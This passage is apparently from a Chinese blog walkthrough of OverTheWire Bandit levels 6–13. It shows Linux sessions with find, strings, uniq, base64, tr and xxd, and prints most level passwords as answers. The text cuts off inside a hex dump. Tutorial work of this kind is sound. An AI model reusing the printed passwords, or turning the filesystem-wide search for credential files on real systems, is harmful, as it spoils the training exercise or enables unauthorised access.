class="line">DXjZPULLxYr17uwoI01bNLQbtFemEgo7</span><br><span class="line">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        bandit5@bandit:~/inhere$</span><br></pre></td></tr></table></figure><p>给出三个条件：可读的，大小为1033bytes，不可执行的</p><p>明显的，只有大小最好搜索，使用命令<code>du -a -b</code>显示出所有文件，以bytes为单位的大小，然后使用管道过滤搜索就行了</p><h3 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h3><blockquote><p><a href="https://www.runoob.com/linux/linux-comm-find.html" target="_blank" rel="noopener">https://www.runoob.com/linux/linux-comm-find.html</a></p><p><a href="https://www.cnblogs.com/RXDXB/p/11696751.html" target="_blank" rel="noopener">https://www.cnblogs.com/RXDXB/p/11696751.html</a></p></blockquote><p>找海量文件终于要用到了find命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">bandit6@bandit:/home$ find / -user <span class="string">'bandit7'</span> -group <span class="string">'bandit6'</span> -size 33c</span><br><span class="line">find: ‘/run/lvm’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit27’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit25’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit2’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit16’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit0’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit20’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit30’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit14’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit33’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit13’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit31’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit8’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit5’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit4’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit29’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit28’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit21’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit26’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit24’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit22’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit1’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit19’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit23’: Permission denied</span><br><span class="line">find: ‘/run/shm’: Permission denied</span><br><span class="line">find: ‘/run/lock/temp/bandit31-git’: Permission denied</span><br><span class="line">find: ‘/run/lock/temp/bandit30-git’: Permission denied</span><br><span class="line">find: ‘/run/lock/temp/bandit29-git’: Permission denied</span><br><span class="line">find: ‘/run/lock/temp/bandit28-git’: Permission denied</span><br><span class="line">find: ‘/run/lock/temp/bandit27-git’: Permission denied</span><br><span class="line">find: ‘/run/lock/temp/bandit5/inhere’: Permission denied</span><br><span class="line">find: ‘/run/lock/lvm’: Permission denied</span><br><span class="line">find: ‘/var/spool/bandit24’: Permission denied</span><br><span class="line">find: ‘/var/spool/rsyslog’: Permission denied</span><br><span class="line">find: ‘/var/spool/cron/crontabs’: Permission denied</span><br><span class="line">find: ‘/var/<span class="built_in">log</span>’: Permission denied</span><br><span class="line">find: ‘/var/tmp’: Permission denied</span><br><span class="line">find: ‘/var/cache/ldconfig’: Permission denied</span><br><span class="line">find: ‘/var/cache/apt/archives/partial’: Permission denied</span><br><span class="line">/var/lib/dpkg/info/bandit7.password</span><br><span class="line">find: ‘/var/lib/apt/lists/partial’: Permission denied</span><br><span class="line">find: ‘/var/lib/polkit-1’: Permission denied</span><br><span class="line">find: ‘/cgroup2/csessions’: Permission denied</span><br><span class="line">find: ‘/home/bandit28-git’: Permission denied</span><br><span class="line">find: ‘/home/bandit30-git’: Permission denied</span><br><span class="line">find: ‘/home/bandit31-git’: Permission denied</span><br><span class="line">find: ‘/home/bandit5/inhere’: Permission denied</span><br><span class="line">find: ‘/home/bandit27-git’: Permission denied</span><br><span class="line">find: ‘/home/bandit29-git’: Permission denied</span><br><span class="line">find: ‘/tmp’: Permission denied</span><br><span class="line">find: ‘/lost+found’: Permission denied</span><br><span class="line">find: ‘/root’: Permission denied</span><br><span class="line">find: ‘/etc/ssl/private’: Permission denied</span><br><span class="line">find: ‘/etc/lvm/backup’: Permission denied</span><br><span class="line">find: ‘/etc/lvm/archive’: Permission denied</span><br><span class="line">find: ‘/etc/polkit-1/localauthority’: Permission denied</span><br><span class="line">find: ‘/sys/fs/pstore’: Permission denied</span><br><span class="line">find: ‘/proc/tty/driver’: Permission denied</span><br><span class="line">find: ‘/proc/29536/task/29536/fd/6’: No such file or directory</span><br><span class="line">find: ‘/proc/29536/task/29536/fdinfo/6’: No such file or directory</span><br><span class="line">find: ‘/proc/29536/fd/5’: No such file or directory</span><br><span class="line">find: ‘/proc/29536/fdinfo/5’: No such file or directory</span><br><span class="line">find: ‘/boot/lost+found’: Permission denied</span><br><span class="line">bandit6@bandit:/home$ cat /var/lib/dpkg/info/bandit7.password</span><br><span class="line">HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs</span><br></pre></td></tr></table></figure><p>毕竟是别人的服务器嘛，找出其中可以访问的就是目标文件了</p><h3 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h3><blockquote><p>strings：用于打印文件中可打印的字符</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bandit7@bandit:~$ ls</span><br><span class="line">data.txt</span><br><span class="line">bandit7@bandit:~$ less data.txt </span><br><span class="line">bandit7@bandit:~$ strings data.txt |grep millionth</span><br><span class="line">millionthcvX2JJa4CFALtqS87jk27qwqGhBM9plV</span><br><span class="line">bandit7@bandit:~$</span><br></pre></td></tr></table></figure><p>一看这题目就感觉很大，用less看下格式，然后直接用grep去查找就行了</p><p>cat命令在这也是可以和strings互换的</p><h3 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h3><blockquote><p>uniq 命令用于检查及删除文本文件中重复出现的行列，一般与 sort 命令结合使用<br>uniq 可检查文本文件中重复出现的行列</p><p><a href="https://www.runoob.com/linux/linux-comm-uniq.html" target="_blank" rel="noopener">https://www.runoob.com/linux/linux-comm-uniq.html</a></p><p>sort命令用于将文本文件内容加以排序<br>sort可针对文本文件的内容，以行为单位来排序</p><p><a href="https://www.runoob.com/linux/linux-comm-sort.html" target="_blank" rel="noopener">https://www.runoob.com/linux/linux-comm-sort.html</a></p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">bandit8@bandit:~$ cat data.txt | sort | uniq -c</span><br><span class="line">     10 07iR6PwHwihvQ3av1fqoRjICCulpoyms</span><br><span class="line">     10 0ob6rCn4D4jQ6KCiaT5hmOdWFrm2quR1</span><br><span class="line">     10 1drBmDT7PYS7hVgoTWkJSjUZUK7ZAIAa</span><br><span class="line">     10 1JnkIYLDOdn5M7TGabYxOWkn7HazMjYW</span><br><span class="line">     10 1wBrW0VGjKeYiXltbEWrUipwSHQfTu44</span><br><span class="line">     10 2Dxbtw8cnKyHwvt0lfFNYOGc4cE59uua</span><br><span class="line">     10 2TRkCQhbMjcM0hwL31NnJQ0DVagWN3Ca</span><br><span class="line">     10 4c7EsUtqLnLR9hiepV5EQVhdMgyi8onL</span><br><span class="line">     10 4cQDXE4IPH8fCBUBZaTPgnY2gwnPnlj6</span><br><span class="line">     10 6495bfC0lI1Qkw5kzZHnbVWooaOZHLvj</span><br><span class="line">     10 6rEzM4Qro8dH0e3uemAyYseTiNiNAYap</span><br><span class="line">     10 78rgduVcLZjLzZmooObdaN541MKV6IfQ</span><br><span class="line">     10 8qkrbCAUG9I28M49j9flUro5fWxenFzF</span><br><span class="line">     10 aIl4xN5maZVCQITz0xH0KNXIlLc0MhNf</span><br><span class="line">     10 aPsCQmSWVYGQQHUD6k1fHC2kqSyMlxwV</span><br><span class="line">     10 awglWaTRSAWBcol8hSMTJP4FYhIGJHVO</span><br><span class="line">     10 bCJdTkork5IRbZaaPZK0WVPgYIIO4mHF</span><br><span class="line">     10 BPl0XNou7xAZAI5fdzWzSmPkW1PnvTE1</span><br><span class="line">     10 bvIaDTzHBOGSO7CfpH9vUrJRRlwYTUA7</span><br><span class="line">     10 CS8HVrDmKGLG53qziqQCLWNRlUP1FHsV</span><br><span class="line">     10 CwwHDVp0pO6zmFp87L9AtFzqU5aB5j9w</span><br><span class="line">     10 CyziIvGRdotoy9yA00RAnvvkvrYdKCPp</span><br><span class="line">     10 DRqDxJYAv7IUfAMmrXtXEiz63TUjqeDn</span><br><span class="line">     10 DXI6y5CNPU06rVpkoZgnZJBWfkdW131j</span><br><span class="line">     10 enNw6tuj8mSxxS7f2Yd05puXVeuCZ39G</span><br><span class="line">     10 ewllxPExW9eaHxAH8WZkW9lDuK5cZcUy</span><br><span class="line">     10 eyKcuNPKnjt25kaOZxkMYQ9xqp45aIk9</span><br><span class="line">     10 fIBXc239DbhORY4t9xjgi7fSm4thHsIb</span><br><span class="line">     10 fiK30QpqzoULACXZwkBEKJZvpPQx9Uqm</span><br><span class="line">     10 FlHOKVUDNLx6Ga7CxC4ISRYNflN1GAnF</span><br><span class="line">     10 G4BHP66B4l3XkvB05CMgzrEKyjHhuCwz</span><br><span class="line">     10 gCx35PlKn08nrFFrAgHYLrUVWWZjLdqM</span><br><span class="line">     10 GEzwi36aKB8PLlCPH2wzl9gHzVm97IYu</span><br><span class="line">     10 glONDdR72FJL3Gc03nVNO4PKNzXFGH1A</span><br><span class="line">     10 gqGBgY1IdFDGG2XzB2o1VNGY4j6OL76V</span><br><span class="line">     10 h7jtcUsBhrryyLhtt1mT6Jdmp0l6ozBs</span><br><span class="line">     10 HKryX0XX2HT4WBT0OUzRz5Ac5B2rvIHU</span><br><span class="line">     10 iM3PaCO3VAxAdbdVsdGtEwuwrFQPYJV7</span><br><span class="line">     10 irGm6F73sbUrFhHukhp6JXgMQyLxJTz1</span><br><span class="line">     10 jtNdk5KDgrMkxgbZSJOvjOcM58svrzDY</span><br><span class="line">     10 jVscZ5eK5DWN7IvDSehXmyplCXRSbHJS</span><br><span class="line">     10 KerqNiDbY0zV2VxnOCmWX5XWxumldlAe</span><br><span class="line">     10 kha3sCpHsydUNrxLLXV3cFqWyucGjdxr</span><br><span class="line">     10 kt1VUEZpimCS4BaoAvhN3rgHOmhqaMIR</span><br><span class="line">     10 KUzqHCrxHSpgfkF5ZAzUfjlBaXW3zIaZ</span><br><span class="line">     10 L0nxAwlfV9V3J5onKIT8KYQ9InTcQ7yE</span><br><span class="line">     10 lnB8MWOYjETxoC8bQYrMFnxxQXAWHjP4</span><br><span class="line">     10 lZ9DhnzeHgIuLqYPmNzONpMCkuBYoeJI</span><br><span class="line">     10 M8JMUd7MSd4mOwZj1843ejBH5RXJOloa</span><br><span class="line">     10 mdug9JbW836YVZh3ALULBAxODlinqonJ</span><br><span class="line">     10 MIpMch66sYTmmqepKYczlRA9aJrnkt68</span><br><span class="line">     10 MpAqsgjJIVLT1MxSZcRoOOzl6g1db98Q</span><br><span class="line">     10 MQrydyojsVIYJSY8y1nCMjZGxnL1My7F</span><br><span class="line">     10 MsxcvOe3PGrt78wpZG2bBNF5wfXpZhET</span><br><span class="line">     10 n5fEmvCXKbJErzIDt3MLTmZZVMRNynrR</span><br><span class="line">     10 NL91hwGrqW5lVgoicb592Sd0djnHnbjZ</span><br><span class="line">     10 Nnih4Q0jf3xEOTcmM3yw2HkOm3VPox0w</span><br><span class="line">     10 NT4p09XwRb0k0wG9yIuvfs3MblMGpMc1</span><br><span class="line">     10 nU5zbsdUfmzv7cjNwkV9Hgb65OVe5EDt</span><br><span class="line">     10 nyvBweoC3kzt5QRTjbDfrWO7jhwOGN4g</span><br><span class="line">     10 OcVxHzDW027KWNFS03G31KQEb5TgN1WV</span><br><span class="line">     10 peXkYozDKE2u2BEOed5vvkY0nyjkGawn</span><br><span class="line">     10 PXHEt0PztCiArDZ7UCBmqKdBCiXNQWBN</span><br><span class="line">     10 QmFayGbrzFoiQ5Z2PGmnD2N6Pf77cxl9</span><br><span class="line">     10 QNTac9UtCmQ5VGAnzj10Z9BwV4TuaVvu</span><br><span class="line">     10 qsbKthWb80f3vQKBP7O12SjfFo1V5VkL</span><br><span class="line">     10 quhCb8ZIUJXXM2SbY1ER1D5GaDlQjdDa</span><br><span class="line">     10 QYeOFhgJCJEfKM1ZpT0K322R6SuKdCFT</span><br><span class="line">     10 r0VIMA1yzv838m7UfvutUhCf0zaY3Rqw</span><br><span class="line">     10 rfUNSGOvmQXz0m7PtFoEoPg1BpTbll7X</span><br><span class="line">     10 rJMbGeeDTMsj1RA4YibIQr0o9azHgP0I</span><br><span class="line">     10 rQAYnkKAXIViP4ROmehnDMIAXLpOOLEp</span><br><span class="line">     10 sBB2H7HateUFxr2oxrqUVoumFM60f1lj</span><br><span class="line">     10 SjFHXKRcIc7jlAYGknVMnGXSFd6xRmnF</span><br><span class="line">     10 tDZbF2SuhsvfaA3eTnwfcjQa1pZoPJeX</span><br><span class="line">     10 tiyVGzZcRwUPVAiqkroFMUbMI9ut9hcT</span><br><span class="line">     10 tLKyRATtoCuxMR4zZg1Dnlnr3je3bSHe</span><br><span class="line">     10 tmzBM5rcV9y7AM1xDHudL2yX9oefGieT</span><br><span class="line">     10 tWwjd16fG17vGdjutfOygVTjEGxlijOS</span><br><span class="line">     10 uBRx9inQTeaDZAuzEb2MadWXmkH8uW4O</span><br><span class="line">      1 UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR</span><br><span class="line">     10 vBo3qbjNEF2d3meGEkRfc3mKpjtiDz1i</span><br><span class="line">     10 VElUBEIhJ4yBgOBSN05WgtV2rF6kkGdz</span><br><span class="line">     10 vl9liaz8TKv1enUi0S2REhn01hKjjFIK</span><br><span class="line">     10 vVwG2mb8rU8eCuIlBhCJrZJ4GWR35nWY</span><br><span class="line">     10 W0vbGkT5mfRVWHAXCcMekevbenMJHFhN</span><br><span class="line">     10 W6pn7siBPh5G6ndjv1xx26iHxke8PviX</span><br><span class="line">     10 WaKxNQhiI9dXwvzB1PMpbQRy4CutGrWt</span><br><span class="line">     10 WbfstqfIvgiEuCVVuxwLgLyzUMtho2jP</span><br><span class="line">     10 WBjoFnis277W9vWB8M67h3z1glOYG2Fy</span><br><span class="line">     10 wSpAMdiBSeywE4d1DQZoSp5o8ZVOCqGP</span><br><span class="line">     10 wWfTfhYKmBkmyGH9D6Qjb6x7bMt5narC</span><br><span class="line">     10 x0bga8Oxz5lgM8k52HrYy4ez7XJI0lM0</span><br><span class="line">     10 XURYdoIx95clq6s90MORDydQ187DxQhS</span><br><span class="line">     10 xWmqkcrZ7TmjE7LKjqHVXSLw9fqsjYXp</span><br><span class="line">     10 XWy99VXVCnwdr780PK86hP6rBMkV5E3n</span><br><span class="line">     10 y9sn56N0ZhyxaySYRs518D4vqkMShHwb</span><br><span class="line">     10 YiQvaaidmD39i0ryGZz97Upc5NjgPklY</span><br><span class="line">     10 YR0sflfJZ34iuY3wM3DNNO19dBYnJDmt</span><br><span class="line">     10 yXGLvp7UaeiDKxLGXQYlWuRWdIgeCaT0</span><br><span class="line">     10 YzZX7E35vOa6IQ9SRUGdlEpyaiyjvWXE</span><br><span class="line">bandit8@bandit:~$ cat data.txt | sort | uniq -u</span><br><span class="line">UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR</span><br></pre></td></tr></table></figure><p>这里的知识是linux的文本处理</p><p>用<code>uniq -c</code>统计每个字符串出现的次数，<code>-u</code>即可显示只出现一次的字符串 </p><h3 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h3><p>找出以<code>=</code>开头的字符出，可读的</p><p>第一反应想到的是正则表达式和strings命令，尝试了一下，直接成功</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">bandit9@bandit:~$ strings data.txt |grep <span class="string">"=.*"</span></span><br><span class="line">2========== the</span><br><span class="line">========== password</span><br><span class="line">&gt;t=yP</span><br><span class="line">rV~dHm=</span><br><span class="line">========== isa</span><br><span class="line">=FQ?P\U</span><br><span class="line">=F[</span><br><span class="line">pb=x</span><br><span class="line">J;m=</span><br><span class="line">=)$=</span><br><span class="line">========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk</span><br><span class="line">iv8!=</span><br><span class="line">bandit9@bandit:~$ </span><br><span class="line">bandit9@bandit:~$ strings data.txt |grep <span class="string">"="</span></span><br><span class="line">2========== the</span><br><span class="line">========== password</span><br><span class="line">&gt;t=yP</span><br><span class="line">rV~dHm=</span><br><span class="line">========== isa</span><br><span class="line">=FQ?P\U</span><br><span class="line">=F[</span><br><span class="line">pb=x</span><br><span class="line">J;m=</span><br><span class="line">=)$=</span><br><span class="line">========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk</span><br><span class="line">iv8!=</span><br></pre></td></tr></table></figure><p>后面看别人直接grep也能成功，可真是出人意料</p><p>这边的知识点应该是grep是支持正则表达式的字符串的</p><h3 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bandit10@bandit:~$ strings data.txt | less</span><br><span class="line">bandit10@bandit:~$ strings data.txt </span><br><span class="line">VGhlIHBhc3N3b3JkIGlzIElGdWt3S0dzRlc4TU9xM0lSRnFyeEUxaHhUTkViVVBSCg==</span><br><span class="line">bandit10@bandit:~$ cat data.txt </span><br><span class="line">VGhlIHBhc3N3b3JkIGlzIElGdWt3S0dzRlc4TU9xM0lSRnFyeEUxaHhUTkViVVBSCg==</span><br><span class="line">bandit10@bandit:~$ strings data.txt | base64 -d</span><br><span class="line">The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR</span><br><span class="line">bandit10@bandit:~$</span><br></pre></td></tr></table></figure><p>直接less读取怕文件太大，结果就只有一行明显的base64加密</p><p>百度了linux中base64命令的用法，毕竟题意就是让用linux命令进行操作的</p><p>base64用法如下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">"Hello World"</span> | base64</span><br><span class="line">SGVsbG8gV29ybGQK</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">"SGVsbG8gV29ybGQK"</span> | base64 -d</span><br></pre></td></tr></table></figure><p>加<code>-d</code>选项为解密</p><h3 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h3><p>看题目是rot13加密，如何用linux指令实现呢</p><p>这里用到了<code>tr</code>命令</p><blockquote><p>tr 命令用于转换或删除文件中的字符</p><p>tr 指令从标准输入设备读取数据，经过字符串转译后，将结果输出到标准输出设备</p><p><a href="https://www.runoob.com/linux/linux-comm-tr.html" target="_blank" rel="noopener">https://www.runoob.com/linux/linux-comm-tr.html</a></p><p><a href="https://www.xp.cn/php/2675.html" target="_blank" rel="noopener">https://www.xp.cn/php/2675.html</a></p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bandit11@bandit:~$ cat data.txt </span><br><span class="line">Gur cnffjbeq vf 5Gr8L4qetPEsPk8htqjhRK8XSP6x2RHh</span><br><span class="line">bandit11@bandit:~$ cat data.txt | tr <span class="string">'N-Z A-M n-z a-m'</span> <span class="string">'A-M N-Z a-m n-z'</span></span><br><span class="line">The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu</span><br><span class="line">bandit11@bandit:~$</span><br></pre></td></tr></table></figure><h3 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h3><p>据说这是xxd导出的十六进制文件</p><p>我们去搜xxd命令，恢复成二级制用<code>xxd -r filename</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">bandit12@bandit:~$ mkdir /tmp/magicking</span><br><span class="line">bandit12@bandit:~$ cp data.txt /tmp/magicking/data.txt</span><br><span class="line">bandit12@bandit:~$ <span class="built_in">cd</span> /tmp/magicking</span><br><span class="line">bandit12@bandit:/tmp/magicking$ ls</span><br><span class="line">data.txt</span><br><span class="line">bandit12@bandit:/tmp/magicking$ cat data.txt</span><br><span class="line">00000000: 1f8b 0808 d7d2 c55b 0203 6461 7461 322e  .......[..data2.</span><br><span class="line">00000010: 6269 6e00 013c 02c3 fd42 5a68 3931 4159  bin..&lt;...BZh91AY</span><br><span class="line">00000020: 2653 591d aae5 9800 001b ffff de7f 7fff  &amp;SY.............</span><br><span class="line">00000030: bfb7 dfcf 9fff febf f5ad efbf bbdf 7fdb  ................</span><br><span class="line">00000040: f2fd ffdf effa 7fff fbd7 bdff b001 398c  ..............9.</span><br><span class="line">00000050: 1006 8000 0000 0d06 9900 0000 6834 000d  ............h4..</span><br><span class="line">00000060: 01a1 a000 007a 8000 0d00 0006 9a00 d034  .....z.........4</span><br><span class="line">00000070: 0d1a 3234 68d1 e536 a6d4 4000 341a 6200  ..24h..6..@.4.b.</span><br><span class="line">00000080: 0069 a000 0000 0000 d003 d200 681a 0d00  .i..........h...</span><br><span class="line">00000090: 0001 b51a 1a0c 201e a000 6d46 8068 069a  ...... ...mF.h..</span><br><span class="line">000000a0: 6834 340c a7a8 3406 4000 0680 0001 ea06  h44...4.@.......</span><br><span class="line">000000b0: 8190 03f5 4032 1a00 0343 4068 0000 0686  ....@2...C@h....</span><br><span class="line">000000c0: 8000 0320 00d0 0d00 0610 0014 1844 0308  ... .........D..</span><br><span class="line">000000d0: 04e1 c542 9ab8 2c30 f1be 0b93 763b fb13  ...B..,0....v;..</span><br><span class="line">000000e0: 50c4 c101 e008 3b7a 92a7 9eba 8a73 8d21  P.....;z.....s.!</span><br><span class="line">000000f0: 9219 9c17 052b fb66 a2c2 fccc 9719 b330  .....+.f.......0</span><br><span class="line">00000100: 6068 8c65 e504 5ec0 ae02 fa6d 16bc 904b  `h.e..^....m...K</span><br><span class="line">00000110: ba6c f692 356e c02b 0374 c394 6859 f5bb  .l..5n.+.t..hY..</span><br><span class="line">00000120: 